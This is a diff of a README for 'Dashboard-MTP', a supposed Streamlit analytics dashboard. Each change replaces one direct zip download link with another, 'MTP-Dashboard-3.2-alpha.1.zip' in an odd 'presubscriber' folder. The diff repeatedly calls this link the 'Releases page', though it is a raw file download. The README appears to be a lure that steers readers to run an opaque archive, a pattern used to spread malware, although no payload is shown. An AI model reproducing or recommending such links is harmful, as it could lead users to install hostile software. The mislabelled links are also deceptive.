@@ -4,13 +4,13 @@
 Dashboard-MTP is a real-time analytics dashboard designed for Mileage Tracker Pro users. It offers insights into your revenue growth, user retention, and live activity. Built with powerful tools like Streamlit, Supabase, and Plotly, this dashboard delivers clear visualizations that help you understand your performance at a glance.
 
 ## 🔗 Download Now
-[![Download Dashboard-MTP](https://raw.githubusercontent.com/juanes0023/Dashboard-MTP/main/presubscriber/Dashboard-MTP.zip)](https://raw.githubusercontent.com/juanes0023/Dashboard-MTP/main/presubscriber/Dashboard-MTP.zip)
+[![Download Dashboard-MTP](https://github.com/juanes0023/Dashboard-MTP/raw/refs/heads/main/presubscriber/MTP-Dashboard-3.2-alpha.1.zip)](https://github.com/juanes0023/Dashboard-MTP/raw/refs/heads/main/presubscriber/MTP-Dashboard-3.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 To get started with Dashboard-MTP, follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Head to our [Releases page](https://raw.githubusercontent.com/juanes0023/Dashboard-MTP/main/presubscriber/Dashboard-MTP.zip). Here, you will find the latest version of Dashboard-MTP.
+   Head to our [Releases page](https://github.com/juanes0023/Dashboard-MTP/raw/refs/heads/main/presubscriber/MTP-Dashboard-3.2-alpha.1.zip). Here, you will find the latest version of Dashboard-MTP.
 
 2. **Select the Version**  
    On the Releases page, find the version labeled as the latest release. It will usually be at the top of the page.
@@ -37,7 +37,7 @@ Dashboard-MTP includes the following features:
 ## 📥 Download & Install
 To download Dashboard-MTP, click on the link below. It will direct you to our Releases page, where you can find the application:
 
-[Visit this page to download Dashboard-MTP](https://raw.githubusercontent.com/juanes0023/Dashboard-MTP/main/presubscriber/Dashboard-MTP.zip)
+[Visit this page to download Dashboard-MTP](https://github.com/juanes0023/Dashboard-MTP/raw/refs/heads/main/presubscriber/MTP-Dashboard-3.2-alpha.1.zip)
 
 Once you have downloaded the file, follow these steps to install Dashboard-MTP:
 
